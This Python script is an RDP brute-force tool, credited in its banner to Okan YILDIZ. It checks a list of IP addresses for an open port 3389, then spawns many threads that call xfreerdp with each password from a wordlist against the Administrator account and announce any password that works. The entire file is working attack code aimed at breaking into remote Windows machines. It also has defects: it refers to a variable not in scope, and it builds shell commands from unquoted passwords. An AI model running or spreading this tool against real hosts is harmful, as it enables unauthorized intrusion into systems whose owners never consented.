import os
import sys
import time
import argparse
import subprocess
from concurrent.futures import ThreadPoolExecutor
from queue import Queue
import socket

def parse_args():
    parser = argparse.ArgumentParser(description='Python script for brute forcing RDP login')
    parser.add_argument('--ip-file', type=str, required=True, help='Path to file containing list of IP addresses with open port 3389')
    parser.add_argument('--username', type=str, default='Administrator', help='Username for RDP login (default: Administrator)')
    parser.add_argument('--password-file', type=str, required=True, help='Path to file containing password list')
    parser.add_argument('--delay', type=int, default=0, help='Delay between attempts in seconds (default: 0)')
    parser.add_argument('--max-attempts', type=int, default=1, help='Maximum number of attempts per password (default: 1)')
    parser.add_argument('--threads', type=int, default=40, help='Number of threads to use for brute forcing (default: 40)')
    return parser.parse_args()

def print_banner():
    banner = '''
                                   Okan YILDIZ RDP Brute Force
    '''
    print(banner)

def check_rdp_access(ip, rdp_port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((ip, rdp_port))
        sock.close()
        return result == 0
    except Exception as e:
        print(f"Error: {e}")
        return False

def brute_force(ip, username, rdp_port, max_attempts, password_queue):
    while not password_queue.empty():
        password = password_queue.get()
        attempts = 0
        while attempts < max_attempts:
            cmd = f'xfreerdp /u:{username} /p:{password} /v:{ip} /port:{rdp_port} +auth-only'
            result = subprocess.call(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            if result == 0:
                print(f'Success! Password is {password} for IP address {ip}')
                os._exit(0)
            else:
                print(f'Failed! Password is {password} for IP address {ip}')
            attempts += 1
            time.sleep(args.delay)

def main():
    print_banner()
    args = parse_args()
    passwords = open(args.password_file, 'r').read().splitlines()
    password_queue = Queue()
    for password in passwords:
        password_queue.put(password)
    
    ips = open(args.ip_file, 'r').read().splitlines()
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        for ip in ips:
            if check_rdp_access(ip, 3389):
                print(f"RDP server found at {ip}")
                for _ in range(args.threads):  # Start threads for brute force
                    executor.submit(brute_force, ip, args.username, 3389, args.max_attempts, password_queue)

if __name__ == '__main__':
    main()
